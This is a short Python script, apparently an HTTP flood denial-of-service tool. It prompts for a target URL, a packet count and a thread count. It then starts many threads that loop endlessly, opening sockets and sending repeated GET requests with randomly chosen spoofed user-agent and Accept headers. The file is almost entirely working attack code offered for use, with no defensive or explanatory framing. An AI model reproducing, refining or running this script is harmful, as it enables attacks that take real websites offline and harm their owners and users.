import random
import threading
import socket
import urllib.parse
useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
			"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
			"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
			"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
			"Bloglines/3.1 (http://www.bloglines.com)",
			"CSSCheck/1.2.2",
			"Dillo/2.0",
			"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
			"Download Demon/3.5.0.11",
			"ELinks/0.12~pre5-4",
			"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
			"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
			"EmailWolf 1.00",
			"everyfeed-spider/2.0 (http://www.everyfeed.com)",
			"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
			"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
			"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
			"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
			"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
			"Googlebot-Image/1.0",
			"Googlebot-News",
			"Googlebot-Video/1.0",
			"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
			"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
			"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
			"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
			"HTMLParser/1.6",
			"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
			"iTunes/9.0.2 (Windows; N)",
			"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
			"Java/1.6.0_13",
			"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
			"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
			"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"libwww-perl/5.820",
			"Links/0.9.1 (Linux 2.4.24; i386;)",
			"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
			"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
			"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
			"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
			"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
			"Mediapartners-Google",
			"Microsoft URL Control - 6.00.8862",
			"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
			"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
			"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
			"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
			"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
			"Mozilla/2.02E (Win95; U)",
			"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
			"Mozilla/3.01Gold (Win95; I)",
			"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
			"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
			"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
			"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
			"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
			"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
			"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
			"Mozilla/4.8 [en] (Windows NT 5.1; U)",
			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
			"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
			"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
			"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0",
			"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu"]
			
url = input("URL : ")
packate = int(input("packate 100 / :"))
th = int(input("100 thread / :"))
hostt = urllib.parse.urlparse(url)
host = hostt[1]			
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host + "\r\n"
port = 80
acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
		"Accept-Encoding: gzip, deflate\r\n", 
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		]
print ("Connect To ",url)		
connection = "Connection: Keep-Alive\r\n" 
awaits = threading.Event()
def raw():
	useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
	accept = random.choice(acceptall)
	p = get_host + useragent + accept + connection + "\r\n" 
	port = 80
	while True:
		awaits.wait()
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(host),int(port))) 
			s.send(str.encode(p))
			try:
				for i in range(packate):
					s.send(str.encode(p)) 
			except:
				s.close()
		except:
			s.close()
			
		
	
	

for i in range(th):
		threading.Thread(target=raw).start()
		awaits.set()
		
		
	
	
	
	

	
	

	
	
